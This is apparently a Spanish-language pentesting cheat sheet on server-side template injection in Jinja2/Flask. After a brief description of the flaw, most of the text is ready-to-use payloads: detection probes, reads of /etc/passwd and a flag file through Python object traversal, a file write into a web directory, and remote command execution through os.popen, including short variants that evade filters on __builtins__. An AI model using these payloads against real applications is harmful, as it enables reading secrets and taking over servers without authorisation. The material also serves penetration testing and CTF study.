# Server Side Template Injection

- [Descripción de la vulnerabilidad](#descripci%C3%B3n-de-la-vulnerabilidad)
- [Jinja2 - Inyecciones básicas](#jinja2---inyecciones-b%C3%A1sicas)
- [Jinja2 - Read remote file](#jinja2---read-remote-file)
- [Jinja2 - Write into remote file](#jinja2---write-into-remote-file)
- [Jinja2 - Remote Code Execution](#jinja2---remote-code-execution)
  - [Jinja2 - Forcing output on blind RCE](#jinja2---forcing-output-on-blind-rce)

# Descripcion de la vulnerabilidad
Es una vulnerabilidad de seguridad que se produce cuando una aplicación web permite la inserción de código en un lenguaje de plantillas. En lugar de atacar directamente la infraestructura subyacente o la base de datos, como en otras vulnerabilidades de inyección, SSTI apunta a los mecanismos de generación de contenido dinámico en el servidor.

Las aplicaciones web suelen utilizar lenguajes de plantillas como:
- Jinja2 (Python)
- Twig (PHP)
- FreeMarker (Java)
- Flask

Un aspecto clave para detectar una vulnerabilidad SSTI es identificar uno de los lenguajes de plantilla anteiores en la aplicaion web, una vez identificado podemos empezar a inyectar payloadsd basicos en los inputs de la aplicacion

# Jinja2 - Inyecciones basicas
````
{{7*7}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
````


# Jinja2 - Read remote file

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

# Jinja2 - Write into remote file

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

# Jinja2 - Remote Code Execution

## Jinja2 - Forcing output on blind RCE

Podemos importar funciones Flask para que nos devuelva un output desde la pagina vulnerable
```python
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```

## Usando  os.popen().read()

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Cuando se filtra `__builtins__` , los siguientes payloads no tienen contexto y no requieren nada, excepto estar en un objeto Plantilla jinja2:

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

Payloads cortos

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
